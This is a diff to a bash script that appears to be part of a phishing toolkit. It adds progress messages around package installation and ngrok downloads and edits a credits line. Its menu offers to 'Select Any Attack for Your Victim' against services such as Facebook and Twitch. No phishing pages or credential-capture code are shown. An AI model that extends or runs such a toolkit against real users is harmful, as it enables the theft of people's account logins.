@@ -47,10 +47,11 @@ printf "\n"
 
 reqs() {
 
-command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install php -y > /dev/null 2>&1; }
-command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install curl -y > /dev/null 2>&1; }
-command -v wget > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing wget\e[0m\n\n"; apt-get install wget -y > /dev/null 2>&1; }
-command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing unzip\e[0m\n\n"; apt-get install zip unzip -y > /dev/null 2>&1; }
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Installing packages..\e[0m\n"
+command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install php -y; }
+command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing php\e[0m\n\n"; apt-get install curl -y; }
+command -v wget > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing wget\e[0m\n\n"; apt-get install wget -y; }
+command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Installing unzip\e[0m\n\n"; apt-get install zip unzip -y; }
 
 if [[ -d .htr ]]; then
 printf ""
@@ -69,6 +70,7 @@ else
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
@@ -80,6 +82,7 @@ printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[
 exit 1
 fi
 else
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
@@ -99,6 +102,7 @@ else
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
 if [[ -e ngrok-2.2.8-linux-arm64.zip ]]; then
 unzip ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
@@ -110,6 +114,7 @@ printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[
 exit 1
 fi
 else
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-2.2.8-linux-386.zip ]]; then
 unzip ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
@@ -134,6 +139,7 @@ fi
 
 menu() {
 
+banner
 printf "      \e[0m\e[1;46m[::]  Select Any Attack for Your Victim  [::]\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt	\e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;93m About\e[0m\n"
@@ -416,7 +422,7 @@ printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://linktr.ee/tahmi
 printf "\e[0m\n"
 printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m2.1 Beta\e[0m\n"
 printf "\e[0m\n"
-printf "   \e[0m\e[41mThanks to Equinockx , Hiddeneye Team & Thelinuxchoice\e[0m\n"
+printf "   \e[0m\e[41mThanks to MoisesTapia , Hiddeneye Team & Thelinuxchoice\e[0m\n"
 printf "\e[0m\n"
 printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
 printf "\e[0m\n"
